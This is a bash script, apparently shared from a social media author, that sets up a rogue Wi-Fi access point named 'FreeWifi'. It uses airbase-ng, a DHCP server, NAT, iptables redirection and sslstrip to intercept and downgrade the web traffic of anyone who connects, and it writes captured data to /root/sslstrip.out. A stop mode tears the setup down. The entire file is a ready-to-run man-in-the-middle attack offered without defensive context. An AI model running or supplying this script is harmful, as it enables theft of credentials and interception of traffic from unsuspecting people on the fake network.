#!/bin/bash
# www.facebook.com/soufian.ckin2u 
if [ "$1" == "stop" ];then
echo "Killing Airbase-ng..."
pkill airbase-ng
sleep 3;
echo "Killing DHCP..."
pkill dhcpd3
sleep 3;
echo "Flushing iptables"
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo "killing sslstrip the hard way"
killall python
echo "killing DHCP server"
killall dhcpd3
echo "disabling IP Forwarding"
echo "0" > /proc/sys/net/ipv4/ip_forward
echo "removing alfa and bringing it back - vmware only"
rmmod rtl8187
rfkill block all
rfkill unblock all
modprobe rtl8187
sleep 5
rfkill unblock all
echo "bringing up wlan0"
ifconfig wlan0 up
elif [ "$1" == "start" ] ; then
echo "Putting card in monitor mode"
airmon-ng start wlan0 # Change to your wlan interface
sleep 5;
echo "Starting Fake AP..."
airbase-ng -e FreeWifi -c 11 mon0 & # Change essid, channel and interface
sleep 5;
echo "configuring interface at0 according to dhcpd3 config"
ifconfig at0 up
ifconfig at0 10.0.0.254 netmask 255.255.255.0 # Change IP addresses as configured in your dhcpd.conf
echo "adding a route"
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.254
sleep 5;
echo "configuring iptables"
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE # Change eth1 to your internet facing interface
echo "setting up sslstrip interception"
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
cd /pentest/web/sslstrip/ && python sslstrip.py -a -w /root/sslstrip.out &
sleep 2;
cd ~
echo "clearing lease table"
echo > '/var/lib/dhcp3/dhcpd.leases'
echo "starting new DHCPD server"
ln -s /var/run/dhcp3-server/dhcpd.pid /var/run/dhcpd.pid
dhcpd3 -d -f -cf /etc/dhcp3/dhcpd.conf at0 &
sleep 5;
echo "enabling IP Forwarding...ENJOY the SHOW"
echo "1" > /proc/sys/net/ipv4/ip_forward
else
echo "usage: ./airstrip.sh stop|start"
fi
